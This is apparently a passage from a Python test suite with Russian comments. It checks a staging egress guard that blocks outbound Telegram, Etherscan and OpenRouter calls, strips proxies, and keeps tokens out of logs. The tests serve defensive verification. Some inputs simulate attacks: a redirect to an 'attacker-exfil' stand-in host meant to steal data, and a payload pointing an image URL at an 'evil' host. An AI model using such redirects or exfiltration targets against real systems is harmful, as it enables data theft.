    исключения — прежний код отдавал str(e) наружу. Теперь — стабильный код
    ошибки, ни исключение, ни URL никуда не уходят и не логируются."""
    result, proc = run_script('''
        import io, contextlib
        from unittest.mock import patch
        import requests
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)

        class FakeSession:
            trust_env = True
            def post(self, url, **kwargs):
                raise requests.exceptions.ConnectionError(
                    'HTTPSConnectionPool: Max retries exceeded with url: ' + url)
            def close(self):
                pass

        captured = io.StringIO()
        with patch('requests.Session', return_value=FakeSession()):
            with contextlib.redirect_stdout(captured):
                res = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'x'})

        token = os.environ['STAND_TG_TOKEN']
        OUT({
            'error': res.get('error'),
            'token_in_error': token in (res.get('error') or ''),
            'token_in_stdout': token in captured.getvalue(),
        })
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['error'] == 'bot_identity_mismatch'
    assert result['token_in_error'] is False
    assert result['token_in_stdout'] is False


# ───────────────── ранее отмеченные непокрытыми точки выхода ───────────────

def test_stand_tg_send_group_disabled_no_network():
    """_stand_tg_send (группа STAND_TG_CHAT) выключена насовсем — план п.1.2:
    T5 заменит на личку через tg_call. Токен и chat_id в env валидны, но
    функция не должна даже пытаться открыть соединение."""
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import app
        before = stand_egress.status()['blocked_count']
        sent = app._stand_tg_send('SYNTHETIC AUDIT MESSAGE')
        after = stand_egress.status()['blocked_count']
        OUT({'sent': sent, 'blocked_count_unchanged': after == before})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['sent'] is False
    assert result['blocked_count_unchanged'] is True


def test_verify_transfer_ignores_direct_get_and_prod_key_in_stand_mode():
    """На стенде verify_transfer не должен вызывать ни переданный вызывающим
    `get`, ни прод-ключ Etherscan — только read_get(T9) и STAND_ETHERSCAN_API_KEY."""
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import stand_transfers as st

        def boom(*a, **kw):
            raise AssertionError('прямой get() не должен вызываться на стенде')

        calls = []
        def fake_read_get(op, params=None, _base_url=None):
            calls.append(op)
            if op == 'tron_tx_info':
                return 200, {}, None  # ещё не появилась в TronScan
            raise AssertionError(f'неожиданный op={op}')
        stand_egress.read_get = fake_read_get

        r_trc20 = st.verify_transfer('a' * 64, 'trc20',
                                     'TWBgeUo74DehAPgw5cKTdYUTXtJELqwwqn',
                                     'TWBgeUo74DehAPgw5cKTdYUTXtJELqwwqn',
                                     100, get=boom)
        # erc20 — решение Карима: на стенде из сетей только TRC-20, ERC-20
        # отказывает до сети всегда, даже если бы был передан прод-ключ.
        r_erc20 = st.verify_transfer('0x' + 'a' * 64, 'erc20',
                                     '0x' + 'c' * 40, '0x' + 'b' * 40, 100,
                                     get=boom, etherscan_key='fake')
        OUT({'trc20_status': r_trc20['status'], 'erc20_status': r_erc20['status'],
             'erc20_error': r_erc20.get('checkError'), 'read_get_calls': calls})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['trc20_status'] == 'pending'
    assert result['erc20_status'] == 'error'
    assert 'ERC-20' in (result['erc20_error'] or '')
    assert result['read_get_calls'] == ['tron_tx_info']


def test_verify_transfer_erc20_disabled_on_stand_even_with_stand_etherscan_key():
    """Решение Карима: на стенде из сетей только TRC-20 — ERC-20 отказывает
    до сети даже при заданном STAND_ETHERSCAN_API_KEY, read_get не вызывается."""
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import stand_transfers as st

        def fake_read_get(op, params=None, _base_url=None):
            raise AssertionError(f'read_get не должен вызываться для ERC-20: {op}')
        stand_egress.read_get = fake_read_get

        r = st.verify_transfer('0x' + 'a' * 64, 'erc20',
                               '0x' + 'c' * 40, '0x' + 'b' * 40, 100)
        OUT({'status': r['status'], 'checkError': r.get('checkError')})
    ''', extra_env={'STAND_ETHERSCAN_API_KEY': 'stand-fake-key'})
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 'error'
    assert 'ERC-20' in (result['checkError'] or '')


def test_referral_links_empty_bot_and_wa_links_in_stand_mode():
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import app
        links = app.referral_links('GR-TEST', 'ru')
        OUT(links)
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['bot_link'] == ''
    assert result['wa_link'] == ''
    assert result['referral_link']  # сама ссылка на калькулятор остаётся


def test_transfer_poll_thread_started_by_default():
    """T9: дефолт вернули на '1' — поллер ходит только через read_get (канал T9),
    поэтому с заливкой прод-данных и включённым каналом он снова нужен по умолчанию."""
    result, proc = run_script('''
        import threading
        import stand_egress
        stand_egress.install()
        import app
        import time
        time.sleep(0.2)
        names = [t.name for t in threading.enumerate()]
        OUT({'poll_thread_running': 'stand-transfer-poll' in names})
    ''', extra_env={'STAND_TRANSFER_POLL_ENABLED': None})  # снимаем ключ — проверяем дефолт
    assert proc.returncode == 0, proc.stderr
    assert result['poll_thread_running'] is True


def test_transfer_poll_thread_can_still_be_disabled():
    result, proc = run_script('''
        import threading
        import stand_egress
        stand_egress.install()
        import app
        import time
        time.sleep(0.2)
        names = [t.name for t in threading.enumerate()]
        OUT({'poll_thread_running': 'stand-transfer-poll' in names})
    ''', extra_env={'STAND_TRANSFER_POLL_ENABLED': '0'})
    assert proc.returncode == 0, proc.stderr
    assert result['poll_thread_running'] is False


# ───────────── фиксы по QA-раунду 2 (proxy, chat_id, логи, деньги) ─────────

def test_env_proxy_stripped_and_ignored_even_for_direct_stand_egress_import():
    """QA E10/E11: с HTTPS_PROXY/ALL_PROXY в env запрос к api.telegram.org уходил
    в CONNECT-туннель прокси (адрес прокси — loopback, он разрешён), а реальная
    цель на сокетном уровне не видна вообще. install() обязан стереть env-прокси
    сам — тест импортирует только stand_egress, без app.py."""
    result, proc = run_script('''
        import http.server, threading, os, requests

        class Proxy(http.server.BaseHTTPRequestHandler):
            hits = []
            def do_CONNECT(self):
                Proxy.hits.append(self.path)
                self.send_error(403)
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), Proxy)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        os.environ['HTTPS_PROXY'] = f'http://127.0.0.1:{srv.server_port}'
        os.environ['ALL_PROXY'] = f'http://127.0.0.1:{srv.server_port}'

        import stand_egress
        stand_egress.install()

        try:
            requests.get('https://api.telegram.org/botWRONG:TOKEN/getMe', timeout=2)
        except Exception:
            pass

        OUT({
            'proxy_env_left': {k: os.environ.get(k) for k in
                               ('HTTPS_PROXY', 'ALL_PROXY', 'HTTP_PROXY', 'NO_PROXY')},
            'proxy_connects': Proxy.hits,
            'guard_blocks': stand_egress.status()['blocked_count'],
        })
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['proxy_env_left'] == {'HTTPS_PROXY': None, 'ALL_PROXY': None,
                                        'HTTP_PROXY': None, 'NO_PROXY': None}
    assert result['proxy_connects'] == [], 'запрос не должен был даже дойти до прокси'
    assert result['guard_blocks'] >= 1


def test_tg_call_rejects_non_int_and_bool_chat_id():
    """QA E08: int('555') тихо принимал строку — chat_id обязан быть настоящим
    int, не строкой и не bool (bool — подкласс int в Python)."""
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)  # разрешающая политика — не должна спасать плохой тип

        r_str = stand_egress.tg_call('sendMessage', {'chat_id': '555', 'text': 'x'},
                                     _base_url=f'http://127.0.0.1:{_tg_port}')
        r_bool = stand_egress.tg_call('sendMessage', {'chat_id': True, 'text': 'x'},
                                      _base_url=f'http://127.0.0.1:{_tg_port}')
        r_float = stand_egress.tg_call('sendMessage', {'chat_id': 555.0, 'text': 'x'},
                                       _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'str_error': r_str.get('error'), 'bool_error': r_bool.get('error'),
             'float_error': r_float.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['str_error'] == 'invalid_chat_id'
    assert result['bool_error'] == 'invalid_chat_id'
    assert result['float_error'] == 'invalid_chat_id'
    assert result['hits'] == 0


def test_no_secrets_leak_across_blocked_scenarios_stdout_stderr():
    """QA E16: requests вшивает полный URL (…/bot<TOKEN>/method, ?secret=...)
    в текст исключения — прогоняем все прямые Telegram/webhook-функции с
    фейковыми секретами и проверяем, что ни один секрет не просочился ни в
    stdout, ни в stderr subprocess."""
    result, proc = run_script('''
        import io, contextlib
        import stand_egress
        stand_egress.install()
        import app

        buf = io.StringIO()
        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
            app.send_webhook_async('https://webhook.invalid/path?secret=WEBHOOK_SECRET_SENTINEL', {'x': 1})
            import time; time.sleep(0.2)
            app._tg_answer_callback('BOT_TOKEN_SENTINEL', 'q', 'x')
            app._tg_edit_message('BOT_TOKEN_SENTINEL', {'message': {'chat': {'id': 555}, 'message_id': 1}}, 'x')
            app._tg_send_document('BOT_TOKEN_SENTINEL', 555, b'X', 'test.pdf', 'x')
            app.send_telegram_notification('x')
            import os
            os.environ['REF_LOGIN_BOT_TOKEN'] = 'DM_TOKEN_SENTINEL'
            app._login_bot_username_cache = None
            class FakeRef:
                telegram_user_id = 555
            app.send_referrer_dm(FakeRef(), 'x')

        out = buf.getvalue()
        OUT({
            'webhook_secret': 'WEBHOOK_SECRET_SENTINEL' in out,
            'bot_token': 'BOT_TOKEN_SENTINEL' in out,
            'dm_token': 'DM_TOKEN_SENTINEL' in out,
        })
    ''', extra_env={'TELEGRAM_BOT_TOKEN': None, 'REF_LOGIN_BOT_TOKEN': None})
    assert proc.returncode == 0, proc.stderr
    assert result['webhook_secret'] is False
    assert result['bot_token'] is False
    assert result['dm_token'] is False
    assert 'WEBHOOK_SECRET_SENTINEL' not in proc.stdout and 'WEBHOOK_SECRET_SENTINEL' not in proc.stderr
    assert 'BOT_TOKEN_SENTINEL' not in proc.stdout and 'BOT_TOKEN_SENTINEL' not in proc.stderr
    assert 'DM_TOKEN_SENTINEL' not in proc.stdout and 'DM_TOKEN_SENTINEL' not in proc.stderr


def test_manual_sync_gsheet_stand_blocked_not_500():
    """QA E03: раньше отдавал голый 500 no_credentials — теперь понятный
    200 stand_blocked, как /api/rates."""
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import app
        app.app.config['TESTING'] = True
        app.limiter.enabled = False
        client = app.app.test_client()
        db = app.get_session()
        try:
            admin = app.AdminUser(username='adm-test', role='admin', password_hash=b'x')
            db.add(admin); db.commit(); admin_id = admin.id
        finally:
            db.close()
        with client.session_transaction() as sess:
            sess['user_id'] = admin_id
        r = client.post('/api/deals/sync-gsheet', json={'deal_ids': [1]})
        OUT({'status': r.status_code, 'body': r.get_json()})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 200
    assert result['body']['stand_blocked'] is True
    assert result['body']['success'] is False


def test_referrer_thb_receipt_closes_despite_blocked_telegram():
    """QA E06: заявка на выплату рефереру в батах не должна виснуть 502-й
    из-за того, что DM и командное уведомление на стенде в принципе не могут
    дойти — деньги (закрытие заявки + сохранение чека) двигаются локально."""
    result, proc = run_script('''
        import io
        import stand_egress
        stand_egress.install()
        import app
        app.app.config['TESTING'] = True
        app.limiter.enabled = False
        client = app.app.test_client()

        db = app.get_session()
        try:
            admin = app.AdminUser(username='adm-test', role='admin', password_hash=b'x')
            ref = app.Referrer(name='QA Ref', code='QA-REF-2', token='qa-token-2',
                               default_percent=10, telegram_user_id=555, active=True, is_test=False)
            db.add_all([admin, ref]); db.commit()
            admin_id, ref_id = admin.id, ref.id
            req = app.PayoutRequest(referrer_id=ref_id, amount_usdt=3, wallet='QA',
                                    contact_method='telegram', contact_value='QA',
                                    status='new', payout_method='thb', thb_amount=100)
            db.add(req); db.commit()
            req_id = req.id
        finally:
            db.close()

        with client.session_transaction() as sess:
            sess['user_id'] = admin_id
        r = client.post(f'/api/payout-requests/{req_id}/receipt',
                        data={'file': (io.BytesIO(b'fake receipt'), 'receipt.pdf')},
                        content_type='multipart/form-data')
        OUT({'status': r.status_code, 'body': r.get_json()})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 200
    assert result['body']['success'] is True
    assert result['body']['request']['status'] == 'paid'


# ───────────── фиксы по повторному аудиту (loopback, прокси, tg_ctx) ───────

def test_proxy_env_set_after_install_still_blocked():
    """QA app-late-proxy.py/postinstall-proxy.py: env-прокси, выставленный
    ПОСЛЕ install() (или после import app), не должен уводить запрос в
    CONNECT-туннель — прокси на loopback больше не разрешён по умолчанию,
    да и Session.request/send теперь сами гасят trust_env и proxies."""
    result, proc = run_script('''
        import http.server, threading, requests, os

        class Proxy(http.server.BaseHTTPRequestHandler):
            hits = []
            def do_CONNECT(self):
                Proxy.hits.append(self.path)
                self.send_error(403)
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), Proxy)
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()

        # Прокси выставлен ПОСЛЕ install() — одноразовая чистка env в install()
        # его не поймала бы, если бы не второй слой (Session.request/send).
        proxy = f'http://127.0.0.1:{srv.server_port}'
        os.environ['HTTPS_PROXY'] = proxy
        os.environ['ALL_PROXY'] = proxy

        try:
            requests.get('https://api.telegram.org/botWRONG:TOKEN/getMe', timeout=2)
        except Exception:
            pass

        OUT({'proxy_connects': Proxy.hits, 'guard_blocks': stand_egress.status()['blocked_count']})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['proxy_connects'] == []
    assert result['guard_blocks'] >= 1


def test_explicit_proxies_kwarg_ignored():
    """Явный kwarg proxies= в самом вызове requests тоже не должен работать —
    env стереть недостаточно, если код передаёт прокси программно."""
    result, proc = run_script('''
        import http.server, threading, requests

        class Proxy(http.server.BaseHTTPRequestHandler):
            hits = []
            def do_CONNECT(self):
                Proxy.hits.append(self.path)
                self.send_error(403)
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), Proxy)
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()

        proxy = f'http://127.0.0.1:{srv.server_port}'
        try:
            requests.get('https://api.telegram.org/botWRONG:TOKEN/getMe', timeout=2,
                        proxies={'https': proxy})
        except Exception:
            pass

        OUT({'proxy_connects': Proxy.hits, 'guard_blocks': stand_egress.status()['blocked_count']})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['proxy_connects'] == []
    assert result['guard_blocks'] >= 1


def test_urllib_getproxies_neutralized():
    result, proc = run_script('''
        import urllib.request
        import stand_egress
        stand_egress.install()
        OUT({'getproxies': urllib.request.getproxies()})
    ''', extra_env={'HTTPS_PROXY': 'http://127.0.0.1:1', 'HTTP_PROXY': 'http://127.0.0.1:1'})
    assert proc.returncode == 0, proc.stderr
    assert result['getproxies'] == {}


def test_tg_ctx_allowed_pairs_do_not_leak_between_calls_same_thread():
    """Раньше tg_call инициализировал/чистил allowed_ips, а сетевой код читал
    allowed_pairs — разные поля, второе никогда не чистилось и копилось между
    запросами потока. Один флаг: выставляется на время операции, чистится в
    finally. После tg_call соединение к api.telegram.org в этом же потоке
    вне tg_call обязано блокироваться."""
    result, proc = run_script(_fake_telegram_server_script() + '''
        import socket
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)

        res = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'hi'},
                                   _base_url=f'http://127.0.0.1:{_tg_port}')

        blocked_after = False
        try:
            socket.getaddrinfo('api.telegram.org', 443)
        except socket.gaierror:
            blocked_after = True

        OUT({'tg_call_ok': res.get('ok'), 'blocked_after_call': blocked_after,
             'ctx_active_leaked': getattr(stand_egress._tg_ctx, 'active', False),
             'ctx_pairs_leaked': bool(getattr(stand_egress._tg_ctx, 'allowed_pairs', None))})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['tg_call_ok'] is True
    assert result['blocked_after_call'] is True
    assert result['ctx_active_leaked'] is False
    assert result['ctx_pairs_leaked'] is False


# ─────────────────────── docparse_post / OpenRouter (T15) ──────────────────

def test_docparse_public_scope_cannot_authorize_background_transport():
    result, proc = run_script('''
        import threading, stand_egress, docparse
        stand_egress.install()
        payload = {'model': docparse.DEFAULT_MODEL,
                   'messages': [{'role': 'user', 'content': [{'type': 'text', 'text': 'hi'}]}],
                   'response_format': {'type': 'json_schema',
                       'json_schema': {'name': 'doc', 'strict': True, 'schema': docparse._schema()}}}
        out = []
        def background():
            with stand_egress.docparse_request_scope():
                out.append(stand_egress.docparse_post(payload))
        thread = threading.Thread(target=background)
        thread.start(); thread.join()
        OUT({'error': out[0][2], 'direct_error': stand_egress.docparse_post(payload)[2]})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'error': 'no_request_context', 'direct_error': 'no_request_context'}

def _valid_docparse_payload_script():
    """Собирает ровно тот payload, что строит docparse.py::_call, — не
    придуманный тестом формат."""
    return '''
        import docparse
        content = [{'type': 'text', 'text': 'ping'},
                   {'type': 'image_url', 'image_url': {'url': 'data:image/png;base64,aGVsbG8='}}]
        VALID_PAYLOAD = {
            'model': docparse.DEFAULT_MODEL,
            'messages': [{'role': 'user', 'content': content}],
            'response_format': {'type': 'json_schema',
                                'json_schema': {'name': 'doc', 'strict': True, 'schema': docparse._schema()}},
            'max_tokens': 20000,
            'temperature': 0,
        }
    '''


def _fake_openrouter_server_script():
    return '''
        import threading, http.server, json as _json

        class FakeOR(http.server.BaseHTTPRequestHandler):
            requests = []
            response_body = _json.dumps({'choices': [{'message': {'content': '{}'}}]}).encode()
            response_status = 200

            def do_POST(self):
                length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(length)
                FakeOR.requests.append({
                    'path': self.path, 'method': 'POST',
                    'auth': self.headers.get('Authorization'),
                    'accept_encoding': self.headers.get('Accept-Encoding'),
                    'body': _json.loads(body or b'{}'),
                })
                self.send_response(FakeOR.response_status)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(FakeOR.response_body)

            def do_GET(self):
                FakeOR.requests.append({'path': self.path, 'method': 'GET'})
                self.send_response(200); self.end_headers(); self.wfile.write(b'{}')

            def log_message(self, *a): pass

        _srv = http.server.HTTPServer(('127.0.0.1', 0), FakeOR)
        _or_port = _srv.server_port
        threading.Thread(target=_srv.serve_forever, daemon=True).start()
    '''


def test_docparse_post_reaches_fake_openrouter_with_exact_path_and_bearer_key():
    result, proc = run_script(_fake_openrouter_server_script() + _valid_docparse_payload_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', _or_port)

        status, data, err = authorized_post(
            VALID_PAYLOAD, _base_url=f'http://127.0.0.1:{_or_port}')
        OUT({'status': status, 'err': err, 'ok': data == {'choices': [{'message': {'content': '{}'}}]},
             'hits': len(FakeOR.requests), 'path': FakeOR.requests[-1]['path'],
             'method': FakeOR.requests[-1]['method'],
             'auth': FakeOR.requests[-1]['auth'],
             'accept_encoding': FakeOR.requests[-1]['accept_encoding']})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 200 and result['err'] is None and result['ok'] is True
    assert result['hits'] == 1
    assert result['method'] == 'POST'
    assert result['path'] == '/api/v1/chat/completions'
    assert result['auth'] == 'Bearer fake-docparse-key'
    assert result['accept_encoding'] == 'identity'


def test_docparse_compressed_response_matrix_over_real_http():
    """Сервер игнорирует identity; проверяем framing, лимиты и целостность."""
    result, proc = run_script(_valid_docparse_payload_script() + '''
        import http.server, threading, gzip, zlib, struct
        import stand_egress
        limit = stand_egress._DP_MAX_RESPONSE_BYTES
        good = b'{"choices":[]}'
        cases = [
            ('gzip', gzip.compress(good), 'length', None),
            ('deflate', zlib.compress(good), 'length', None),
            ('gzip', gzip.compress(good), 'chunked', None),
            ('deflate', zlib.compress(good), 'chunked', None),
            ('gzip', gzip.compress(b'{}' + b' ' * (limit - 2)), 'length', None),
            ('gzip', gzip.compress(b'{}' + b' ' * (limit - 1)), 'length', 'too_large'),
            ('deflate', zlib.compress(b'{}' + b' ' * (limit - 1)), 'chunked', 'too_large'),
            ('gzip', gzip.compress(good) + b'x', 'length', 'read_error'),
            ('gzip', gzip.compress(good) + gzip.compress(b'{}'), 'length', 'read_error'),
            ('gzip', gzip.compress(good)[:-8], 'length', 'read_error'),
            ('gzip', gzip.compress(good)[:-1] + b'X', 'length', 'read_error'),
            ('gzip', b'', 'length', 'read_error'),
            ('deflate', zlib.compress(good)[:-1], 'length', 'read_error'),
            ('deflate', zlib.compress(good) + b'x', 'length', 'read_error'),
            ('br', b'fake-br', 'length', 'unsupported_encoding'),
            ('gzip, identity', gzip.compress(good), 'length', 'unsupported_encoding'),
            ('unknown', b'{}', 'length', 'unsupported_encoding'),
        ]
        class Encoded(http.server.BaseHTTPRequestHandler):
            protocol_version = 'HTTP/1.1'
            seen = []
            def do_POST(self):
                self.rfile.read(int(self.headers['Content-Length']))
                self.__class__.seen.append(self.headers.get('Accept-Encoding'))
                encoding, body, framing, _ = cases[len(self.seen)-1]
                self.send_response(200)
                self.send_header('Content-Encoding', encoding)
                if framing == 'length':
                    self.send_header('Content-Length', str(len(body)))
                else:
                    self.send_header('Transfer-Encoding', 'chunked')
                self.end_headers()
                if framing == 'chunked':
                    for chunk in (body[:3], body[3:]):
                        self.wfile.write(('%x\\r\\n' % len(chunk)).encode() + chunk + b'\\r\\n')
                    self.wfile.write(b'0\\r\\n\\r\\n')
                else:
                    self.wfile.write(body)
                self.wfile.flush()
            def log_message(self, *args): pass
        server = http.server.ThreadingHTTPServer(('127.0.0.1', 0), Encoded)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', server.server_port)
        results = []
        for _, _, _, expected_error in cases:
            status, data, error = authorized_post(
                VALID_PAYLOAD, _base_url=f'http://127.0.0.1:{server.server_port}')
            results.append({'status': status, 'error': error,
                            'data_ok': isinstance(data, dict) if error is None else data is None,
                            'expected_error': expected_error})
        OUT({'results': results, 'seen': Encoded.seen})
        server.shutdown()
    ''', timeout=45)
    assert proc.returncode == 0, proc.stderr
    assert len(result['results']) == 17
    assert result['seen'] == ['identity'] * 17
    for item in result['results']:
        assert item['status'] == (200 if item['expected_error'] in (None, 'too_large') else None)
        assert item['error'] == item['expected_error']
        assert item['data_ok']


def test_compressed_reader_checks_deadline_after_decode(monkeypatch):
    """Если время вышло в zlib, JSON не возвращается и новых чтений нет."""
    import gzip
    from types import SimpleNamespace
    import stand_egress

    class FakeSocket:
        def settimeout(self, value): pass

    class Framed:
        length = None
        chunked = False
        fp = SimpleNamespace(raw=SimpleNamespace(_sock=FakeSocket()))
        reads = 0

        def read1(self, size):
            self.reads += 1
            return gzip.compress(b'{}') if self.reads == 1 else b''

    framed = Framed()
    response = SimpleNamespace(headers={'Content-Encoding': 'gzip'},
                               raw=SimpleNamespace(_fp=framed))
    ticks = iter((0.0, 0.0, 2.0))
    monkeypatch.setattr(stand_egress, 'time', SimpleNamespace(monotonic=lambda: next(ticks)))
    assert stand_egress._bounded_http_body(response, 1.0, 100, compressed=True) == (None, 'timeout')
    assert framed.reads == 1


def test_docparse_slow_compressed_chunks_stop_at_shared_deadline():
    result, proc = run_script(_valid_docparse_payload_script() + '''
        import http.server, threading, gzip, time
        import stand_egress
        body = gzip.compress(b'{"choices":[]}')
        class Slow(http.server.BaseHTTPRequestHandler):
            protocol_version = 'HTTP/1.1'
            hits = 0
            def do_POST(self):
                self.__class__.hits += 1
                self.rfile.read(int(self.headers['Content-Length']))
                self.send_response(200)
                self.send_header('Content-Encoding', 'gzip')
                self.send_header('Transfer-Encoding', 'chunked')
                self.end_headers()
                for byte in body:
                    try:
                        self.wfile.write(b'1\\r\\n' + bytes([byte]) + b'\\r\\n')
                        self.wfile.flush()
                    except OSError:
                        return
                    time.sleep(.08)
            def log_message(self, *args): pass
        server = http.server.ThreadingHTTPServer(('127.0.0.1', 0), Slow)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', server.server_port)
        status, data, error = authorized_post(
            VALID_PAYLOAD, timeout=.2, _base_url=f'http://127.0.0.1:{server.server_port}')
        time.sleep(.1)
        OUT({'status': status, 'data': data, 'error': error,
             'elapsed': authorized_post.last_elapsed, 'hits': Slow.hits})
        server.shutdown()
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] is None and result['data'] is None
    assert result['error'] == 'timeout'
    assert result['elapsed'] < .5
    assert result['hits'] == 1


def test_docparse_post_uses_stand_key_never_openrouter_api_key():
    """BASE_ENV несёт оба ключа с разными значениями — в заголовке обязан быть
    STAND_DOCPARSE_KEY, OPENROUTER_API_KEY (прод-ключ) читаться не должен вовсе."""
    result, proc = run_script(_fake_openrouter_server_script() + _valid_docparse_payload_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', _or_port)

        status, data, err = authorized_post(
            VALID_PAYLOAD, _base_url=f'http://127.0.0.1:{_or_port}')
        OUT({'auth': FakeOR.requests[-1]['auth']})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['auth'] == 'Bearer fake-docparse-key'
    assert 'fake-openrouter-key' not in result['auth']


def test_docparse_post_no_key_no_network():
    result, proc = run_script(_fake_openrouter_server_script() + _valid_docparse_payload_script() + '''
        import stand_egress
        stand_egress.install()

        status, data, err = authorized_post(
            VALID_PAYLOAD, _base_url=f'http://127.0.0.1:{_or_port}')
        OUT({'status': status, 'err': err, 'hits': len(FakeOR.requests)})
    ''', extra_env={'STAND_DOCPARSE_KEY': None})
    assert proc.returncode == 0, proc.stderr
    assert result == {'status': None, 'err': 'no_key', 'hits': 0}


@pytest.mark.parametrize('mutation', [
    "VALID_PAYLOAD['tools'] = [{'type': 'function'}]",
    "VALID_PAYLOAD['model'] = 'openai/gpt-4o'",
    "VALID_PAYLOAD['messages'][0]['content'][1]['image_url']['url'] = 'https://evil.invalid/img.png'",
    "VALID_PAYLOAD['messages'][0]['content'].append({'type': 'text', 'text': 'x', 'extra': 1})",
    "VALID_PAYLOAD['response_format']['json_schema']['strict'] = False",
    "VALID_PAYLOAD['response_format']['json_schema']['schema'] = {'type': 'object', 'properties': {'secret': {'type': 'string'}}}",
    "VALID_PAYLOAD.pop('response_format')",
    "VALID_PAYLOAD['temperature'] = 0.7",
    "VALID_PAYLOAD['max_tokens'] = 999999",
])
def test_docparse_post_rejects_payload_outside_fixed_schema_no_network(mutation):
    result, proc = run_script(_fake_openrouter_server_script() + _valid_docparse_payload_script() + f'''
        import stand_egress
        stand_egress.install()
        {mutation}

        status, data, err = authorized_post(
            VALID_PAYLOAD, _base_url=f'http://127.0.0.1:{{_or_port}}')
        OUT({{'status': status, 'err': err, 'hits': len(FakeOR.requests)}})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'status': None, 'err': 'invalid_payload', 'hits': 0}


def test_docparse_post_redirect_not_followed():
    result, proc = run_script('''
        import threading, http.server

        class Redir(http.server.BaseHTTPRequestHandler):
            hits = 0
            def do_POST(self):
                n = int(self.headers.get('Content-Length', 0)); self.rfile.read(n)
                Redir.hits += 1
                self.send_response(302)
                self.send_header('Location', 'https://attacker-exfil.invalid/steal')
                self.end_headers()
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), Redir)
        port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', port)
        import docparse
        payload = {"model": docparse.DEFAULT_MODEL,
                  "messages": [{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
                  "response_format": {"type": "json_schema",
                                      "json_schema": {"name": "doc", "strict": True, "schema": docparse._schema()}}}
        status, data, err = authorized_post(payload, _base_url=f'http://127.0.0.1:{port}')
        OUT({'status': status, 'data': data, 'err': err, 'hits': Redir.hits})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 302
    assert result['err'] == 'redirect_blocked'
    assert result['hits'] == 1


def test_docparse_post_timeout_returns_controlled_error():
    result, proc = run_script('''
        import threading, http.server, time

        class Slow(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get('Content-Length', 0)); self.rfile.read(n)
                time.sleep(2)
                self.send_response(200); self.end_headers(); self.wfile.write(b'{}')
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), Slow)
        port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', port)
        import docparse
        payload = {"model": docparse.DEFAULT_MODEL,
                  "messages": [{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
                  "response_format": {"type": "json_schema",
                                      "json_schema": {"name": "doc", "strict": True, "schema": docparse._schema()}}}
        status, data, err = authorized_post(payload, timeout=0.2, _base_url=f'http://127.0.0.1:{port}')
        OUT({'status': status, 'data': data, 'err': err})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'status': None, 'data': None, 'err': 'timeout'}


def test_docparse_post_network_error_when_server_unreachable():
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        stand_egress.allow_test_target('127.0.0.1', 1)
        import docparse
        payload = {"model": docparse.DEFAULT_MODEL,
                  "messages": [{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
                  "response_format": {"type": "json_schema",
                                      "json_schema": {"name": "doc", "strict": True, "schema": docparse._schema()}}}
        status, data, err = authorized_post(payload, _base_url='http://127.0.0.1:1')
        OUT({'status': status, 'data': data, 'err': err})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'status': None, 'data': None, 'err': 'network_error'}


